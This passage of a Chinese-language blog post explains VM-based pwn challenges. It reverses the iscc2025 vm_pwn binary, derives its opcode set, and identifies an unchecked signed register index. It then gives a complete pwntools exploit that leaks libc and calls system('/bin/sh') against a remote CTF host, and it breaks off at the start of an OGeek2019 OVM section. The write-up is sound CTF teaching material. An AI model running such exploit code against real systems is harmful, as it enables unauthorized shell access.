<li>初始化分配模拟数据存储（buffer）空间 （data段）</li>
<li>初始化伪OPCODE空间 （text段）</li>
</ul>
<p>常见流程</p>
<ul>
<li>输入opcode</li>
<li>有一个分析器，循环分解我们输入的opcode来翻译出汇编指令，多为出入栈和调用寄存器</li>
<li>一般漏洞都在<strong>越界写和越界读</strong>之类的。</li>
</ul>
<p>几个寄存器需要了解：</p>
<ol>
<li><code>PC</code>程序计数器，存放的是一个内存地址，该地址中存放着下一条要执行的计算机指令；</li>
<li><code>SP</code>指针寄存器，永远指向当前栈顶</li>
<li><code>BP</code>基址寄存器，用于指向栈的某些地址，在调用函数的时候会用到</li>
<li><code>AX</code>通用寄存器，用于存放一条指令执行后的结果</li>
</ol>
<p><strong>关于opcode</strong></p>
<p>程序是怎么执行指令的？在编译的时候，编译器会将代码转化为汇编代码然后根据操作系统规定的规则进行机器码的一一对应置换，操作系统通过识别机器码去执行对应的操作。比如说随便取一个程序的一段汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000007DA                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes</span><br><span class="line">.text:00000000000007DF                 lea     rsi, buf        ; buf</span><br><span class="line">.text:00000000000007E6                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000000007EB                 mov     eax, 0</span><br><span class="line">.text:00000000000007F0                 call    _read</span><br></pre></td></tr></table></figure>

<p>在Hex View-1窗口中看到的视图是这样的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00000000000007D0  00 00 48 89 C7 E8 96 FE  FF FF BA 64 00 00 00 48  ..H........d...H</span><br><span class="line">00000000000007E0  8D 35 5A 08 20 00 BF 00  00 00 00 B8 00 00 00 00  .5Z. ...........</span><br><span class="line">00000000000007F0  E8 5B FE FF FF 48 8D 35  B8 00 00 00 48 8D 3D 3D  .....H.5....H.==</span><br></pre></td></tr></table></figure>

<p>如果我们按照地址一一对应的话，就可以得到这样的对应关系：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BA 64 00 00 00            mov     edx, 64h</span><br><span class="line">48 8D 35 5A 08 20 00      lea     rsi, buf</span><br><span class="line">BF 00 00 00 00            mov     edi, 0</span><br><span class="line">B8 00 00 00 00            mov     eax, 0</span><br><span class="line">E8 5B FE FF FF            call    _read</span><br></pre></td></tr></table></figure>

<p>这样的机制同样是使用与vmpwn的程序中的，左侧的二进制码就可以称为<strong>opcode</strong></p>
<p>还有就是vm程序在运行过程中输出字符串的时候，我们在编程的时候会有写像这样的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,buf);</span><br></pre></td></tr></table></figure>

<p>buf中存储的是字符串的地址，这样来输出字符串，但是我们不能写成下面这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="string">&#x27;hello world!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>像这样的一个字符串按照编译的知识，它应该被存储在data段这样的数据存储区。</p>
<p>所以说我们在制作一个简单的VM，就需要具备一个程序应该有的一些结构和空间。比如：寄存器，栈，缓冲区域等。我们可以根据自己喜欢的方式来写属于自己的函数调用约定，写自己喜欢的存储方式。那么总结一下vm就是利用编写程序来实现模拟寄存器、stack、数据缓冲区来实现执行自己定义的虚拟指令（可能不太准确。</p>
<p>vmpwn大概就是利用程序规定的虚拟指令，来利用程序中的漏洞。</p>
<p>下面看几个名词解释：</p>
<p>虚拟机保护技术：所谓虚拟机保护技术，是指将代码翻译为机器和人都无法识别的一串伪代码字节流；在具体执行时再对这些伪代码进行一一翻译解释，逐步还原为原始代码并执行。这段用于翻译伪代码并负责具体执行的子程序就叫作虚拟机VM（好似一个抽象的CPU）。它以一个函数的形式存在，函数的参数就是字节码的内存地址。</p>
<p>VStartVM：虚拟机的入口函数，对虚拟机环境进行初始化。</p>
<p>VMDispather：解释opcode，并选择对应的Handler函数执行，当Handler执行完后会跳回这里，形成一个循环。</p>
<p>opcode：程序可执行代码转换成的操作码。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="iscc2025擂台-vm-pwn"><a href="#iscc2025擂台-vm-pwn" class="headerlink" title="[iscc2025擂台]vm_pwn"></a>[iscc2025擂台]vm_pwn</h2><p>开逆：</p>
<h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  heap = <span class="built_in">malloc</span>(<span class="number">0x1000u</span>LL);                     <span class="comment">// 0x4090</span></span><br><span class="line">  sp_ = <span class="built_in">malloc</span>(<span class="number">0x1000u</span>LL);                      <span class="comment">// 0x40a0</span></span><br><span class="line">  bp_ = sp_ + <span class="number">0x8000</span>;                           <span class="comment">// 0x4088 = 0x40a0 + 0x8000</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter bytecode: &quot;</span>);</span><br><span class="line">  ax_ = read(<span class="number">0</span>, heap, <span class="number">0x1000u</span>LL);               <span class="comment">// 0x4098</span></span><br><span class="line">  execute(reg);                                 <span class="comment">// array_header = 0x4060</span></span><br><span class="line">  <span class="built_in">free</span>(heap);</span><br><span class="line">  <span class="built_in">free</span>(sp_);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>heap，sp_，bp，reg，execute 都是经过重命名后的（一些命名可能不太准确）</p>
<p>重点：这个vmpwn让输入的是字节流，如<code>b&#39;\x01&#39;</code>，<code>b&#39;\x01\xf5\x01&#39;</code>这个也就是opcode代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">|	op	  |  	src		|	dest	|</span><br><span class="line">|	\x01  |    \xf5		|	\x01	|</span><br></pre></td></tr></table></figure>

<p>看一下bss段内存：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.bss:0000000000004040 ; FILE *stderr</span><br><span class="line">.bss:0000000000004040 stderr          dq ?                    ; DATA XREF: LOAD:0000000000000588↑o</span><br><span class="line">.bss:0000000000004040                                         ; push+4C↑r ...</span><br><span class="line">.bss:0000000000004040                                         ; Copy of shared data</span><br><span class="line">.bss:0000000000004048 byte_4048       db ?                    ; DATA XREF: sub_1220+4↑r</span><br><span class="line">.bss:0000000000004048                                         ; sub_1220+2C↑w</span><br><span class="line">.bss:0000000000004049                 align 20h</span><br><span class="line">.bss:0000000000004060 ; _QWORD reg[5]</span><br><span class="line">.bss:0000000000004060 reg             dq 5 dup(?)             ; DATA XREF: main+DB↑o</span><br><span class="line">.bss:0000000000004088 bp_             dq ?                    ; DATA XREF: main+A4↑w</span><br><span class="line">.bss:0000000000004090 ; void *heap</span><br><span class="line">.bss:0000000000004090 heap            dq ?                    ; DATA XREF: main+7F↑w</span><br><span class="line">.bss:0000000000004090                                         ; main+BC↑r ...</span><br><span class="line">.bss:0000000000004098 ax_             <span class="built_in">dd</span> ?                    ; DATA XREF: main+D5↑w</span><br><span class="line">.bss:000000000000409C                 align 20h</span><br><span class="line">.bss:00000000000040A0 ; void *sp_</span><br><span class="line">.bss:00000000000040A0 sp_             dq ?                    ; DATA XREF: main+90↑w</span><br><span class="line">.bss:00000000000040A0                                         ; main+97↑r ...</span><br><span class="line">.bss:00000000000040A0 _bss            ends</span><br><span class="line">.bss:00000000000040A0</span><br></pre></td></tr></table></figure>

<p>这个heap模拟的是内存，应该是栈内存</p>
<h3 id="fetch-opcode"><a href="#fetch-opcode" class="headerlink" title="fetch_opcode()"></a>fetch_opcode()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">fetch_opcode</span><span class="params">(__int64 reg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  __int64 pc; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = *(reg + <span class="number">0x30</span>);                           <span class="comment">// reg+0x30 = 0x4090--&gt;heap</span></span><br><span class="line">  pc = *(reg + <span class="number">0x20</span>);                           <span class="comment">// pc</span></span><br><span class="line">  *(reg + <span class="number">0x20</span>) = pc + <span class="number">1</span>;                       <span class="comment">// pc++</span></span><br><span class="line">  <span class="keyword">return</span> *(v1 + pc);                            <span class="comment">// heap[pc]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数的作用就是一次取一字节的opcode</p>
<h3 id="fetch-next-qword"><a href="#fetch-next-qword" class="headerlink" title="fetch_next_qword()"></a>fetch_next_qword()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_132C</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(*(a1 + <span class="number">0x30</span>) + *(a1 + <span class="number">0x20</span>));			<span class="comment">// heap[pc]</span></span><br><span class="line">  *(a1 + <span class="number">0x20</span>) += <span class="number">8LL</span>;                          <span class="comment">// pc = pc+8</span></span><br><span class="line">  <span class="keyword">return</span> v2;                                    <span class="comment">// heap[pc]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取一个8字节数据，在程序中</p>
<h3 id="push"><a href="#push" class="headerlink" title="push()"></a>push()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1393</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(a1 + <span class="number">40</span>) -= <span class="number">8LL</span>;                            <span class="comment">// sp = sp-8</span></span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">40</span>) &lt; *(a1 + <span class="number">64</span>) )                <span class="comment">// sp &lt; bp</span></span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Stack underflow!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x11u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  **(a1 + <span class="number">40</span>) = a2;                             <span class="comment">// *sp = a2</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数中首先栈顶指针<code>sp -= 8</code>就说明了它是入栈操作，还将a2赋给了sp指向的地址</p>
<h3 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">pop</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">40</span>) &gt;= (*(a1 + <span class="number">64</span>) + <span class="number">0x8000L</span>L) )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Stack overflow!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x10u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = **(a1 + <span class="number">40</span>);</span><br><span class="line">  *(a1 + <span class="number">40</span>) += <span class="number">8LL</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与上面push()相反就是出战喽</p>
<h3 id="execute"><a href="#execute" class="headerlink" title="execute()"></a>execute()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v15 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  opcode = fetch_opcode(reg);                 <span class="comment">// 从内存中取出opcode的第一个op，op1</span></span><br><span class="line">  <span class="keyword">switch</span> ( opcode )</span><br><span class="line">  &#123;                                           <span class="comment">// mov 数组溢出</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      v13 = fetch_opcode(reg);</span><br><span class="line">      reg[v13] = fetch_next_qword(reg);       <span class="comment">// mov reg,num</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:                                  </span><br><span class="line">      v12 = fetch_opcode(reg);				<span class="comment">//取出opcode中第二个op,op2</span></span><br><span class="line">      reg[fetch_opcode(reg)] = *reg[v12];		<span class="comment">//reg[op3] = *op2将op2指向的内存赋值给reg[op3]</span></span><br><span class="line">      <span class="keyword">break</span>;									<span class="comment">//推断：mov reg,[mem]</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      v11 = fetch_opcode(reg);                </span><br><span class="line">      *reg[fetch_opcode(reg)] = reg[v11];		<span class="comment">//*reg[op3] = reg[op2]</span></span><br><span class="line">      <span class="keyword">break</span>;									<span class="comment">//mov [mem],reg</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:                                  </span><br><span class="line">      v10 = fetch_opcode(reg);				</span><br><span class="line">      reg[fetch_opcode(reg)] = reg[v10];		<span class="comment">//reg[op3] = reg[op2]</span></span><br><span class="line">      <span class="keyword">break</span>;									<span class="comment">//mov reg,reg</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      v1 = reg[<span class="number">6</span>];							<span class="comment">// reg[6]=heap_ptr</span></span><br><span class="line">      v2 = reg[<span class="number">4</span>];							<span class="comment">// pc</span></span><br><span class="line">      reg[<span class="number">4</span>] = v2 + <span class="number">1</span>;                        <span class="comment">// pc++</span></span><br><span class="line">      push(reg, reg[*(v1 + v2)]);             <span class="comment">// push reg[heap_ptr+pc] ---&gt; push</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      v3 = reg[<span class="number">6</span>];</span><br><span class="line">      v4 = reg[<span class="number">4</span>];</span><br><span class="line">      reg[<span class="number">4</span>] = v4 + <span class="number">1</span>;                        <span class="comment">// pc++</span></span><br><span class="line">      v5 = *(v3 + v4);</span><br><span class="line">      reg[v5] = pop(reg);                     <span class="comment">// pop reg[heap_ptr+pc] ---&gt; pop</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      v14 = reg[fetch_opcode(reg)];			<span class="comment">// 这里取得是opcode的第三个字节op3</span></span><br><span class="line">      v14(*reg);                              <span class="comment">// call---&gt;op3(reg[0])函数调用</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">      reg[<span class="number">4</span>] = pop(reg);                      <span class="comment">// pop pc ---&gt; ret</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8u</span>:                                  <span class="comment">// exit</span></span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v15;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9u</span>:                                  <span class="comment">// nop</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xAu</span>:                                <span class="comment">// add</span></span><br><span class="line">      v9 = fetch_opcode(reg);					<span class="comment">// op2	</span></span><br><span class="line">      reg[v9] += fetch_next_qword(reg);		<span class="comment">// reg[op2] = reg[op2] + num</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xBu</span>:                                <span class="comment">// sub</span></span><br><span class="line">      v8 = fetch_opcode(reg);</span><br><span class="line">      reg[v8] -= fetch_next_qword(reg);		<span class="comment">// reg[op2] = reg[op2] - num</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Invalid opcode: 0x%02x\n&quot;</span>, opcode);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>因此推出指令集：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\x00: mov reg[op2],num ---&gt; heap_ptr+pc</span></span><br><span class="line"><span class="string">\x01: mov reg[op3],[mem]---&gt;*reg[op2]</span></span><br><span class="line"><span class="string">\x02: mov [mem]---&gt;*reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x03: mov reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x04: push</span></span><br><span class="line"><span class="string">\x05: pop</span></span><br><span class="line"><span class="string">\x06: call---&gt;op3(reg[0])函数调用</span></span><br><span class="line"><span class="string">\x07: ret ---&gt; pop ip</span></span><br><span class="line"><span class="string">\x08: exit</span></span><br><span class="line"><span class="string">\x09: nop</span></span><br><span class="line"><span class="string">\x0a: add reg[op2],num</span></span><br><span class="line"><span class="string">\x0b: sub reg[op2],num</span></span><br><span class="line"><span class="string">op2均为src，op3均为dst</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>漏洞点与其他的vm题类似，这个数组是一个有符号的数组(通过下面<code>movzx</code>看出)，在\x01和\x02是有<strong>数组溢出</strong>的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000017B1 def_152F:                               ; CODE XREF: execute+36↑j</span><br><span class="line">.text:00000000000017B1                 movzx   edx, [rbp+opcode] ; jumptable 000000000000152F default case</span><br><span class="line">.text:00000000000017B5                 mov     rax, cs:stderr</span><br><span class="line">.text:00000000000017BC                 lea     rsi, format     ; &quot;Invalid opcode: 0x%02x\n&quot;</span><br><span class="line">.text:00000000000017C3                 mov     rdi, rax        ; stream</span><br><span class="line">.text:00000000000017C6                 mov     eax, 0</span><br><span class="line">.text:00000000000017CB                 call    _fprintf</span><br><span class="line">.text:00000000000017D0                 mov     edi, 1          ; status</span><br><span class="line">.text:00000000000017D5                 call    _exit</span><br></pre></td></tr></table></figure>

<p>而且我们可以发现程序对数组的下标是没有任何检查的，因此我们可以通过<strong>负数</strong>的下标来读取got表内容，我们可以操作的内存有reg[0]~reg[3]</p>
<p>思路：</p>
<ul>
<li>通过数组溢出读取got表的地址，因为got表不可写，所以我们通过got附近的地址-offest直接计算出malloc的got地址</li>
<li>用可操纵的内存计算libc_base并分别将<code>/bin/sh\x00</code>放入reg[0]，<code>system</code>放入reg[2]</li>
<li>直接通过call调用即可getshell</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-02 17:17:51</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&quot;101.200.155.151&quot;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	b *$rebase(0x14F3)\nb *$rebase(0x15ac)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\x00: mov reg[op2],num ---&gt; heap_ptr+pc</span></span><br><span class="line"><span class="string">\x01: mov reg[op3],[mem]---&gt;*reg[op2]</span></span><br><span class="line"><span class="string">\x02: mov [mem]---&gt;*reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x03: mov reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x04: push</span></span><br><span class="line"><span class="string">\x05: pop</span></span><br><span class="line"><span class="string">\x06: call---&gt;op3(reg[0])函数调用</span></span><br><span class="line"><span class="string">\x07: ret ---&gt; pop ip</span></span><br><span class="line"><span class="string">\x08: exit</span></span><br><span class="line"><span class="string">\x09: nop</span></span><br><span class="line"><span class="string">\x0a: add reg[op2],num</span></span><br><span class="line"><span class="string">\x0b: sub reg[op2],num</span></span><br><span class="line"><span class="string">op2均为src，op3均为dst</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># \x00</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x01</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">1</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x02</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">2</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x03</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_reg</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbb&quot;</span>, <span class="number">3</span>, src_reg, dst_reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x04: push</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">4</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x05: pop</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">5</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x06: call</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_call</span>(<span class="params">reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bB&quot;</span>, <span class="number">6</span>, reg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x08: exit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_vm</span>():</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;b&quot;</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0a: add</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xA</span>, reg, num)<span class="comment">#num要用做地址计算，用8字节类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x0b: sub</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0xB</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment">#先获得data段0x4008的地址此处指向是base+0x4008，可以间接计算got</span></span><br><span class="line">payload = load_indirect(-<span class="number">11</span>, <span class="number">1</span>) + sub_num(<span class="number">1</span>, <span class="number">0x50</span>) + load_indirect(<span class="number">1</span>, <span class="number">0</span>) + sub_num(<span class="number">0</span>, libc.sym[<span class="string">&quot;malloc&quot;</span>]) + mov_reg(<span class="number">0</span>, <span class="number">2</span>) </span><br><span class="line">payload += add_num(<span class="number">2</span>, libc.sym[<span class="string">&quot;system&quot;</span>]) + add_num(<span class="number">0</span>, <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>))) + func_call(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#payload += exit_vm()</span></span><br><span class="line"><span class="comment">#debug(&quot;b *$rebase(0x14F3)\nb *$rebase(0x15ac)&quot;)</span></span><br><span class="line">sla(<span class="string">&quot;bytecode: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>在buuctf中有该题目</p>
<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><h4 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 pc; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 sp_; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span 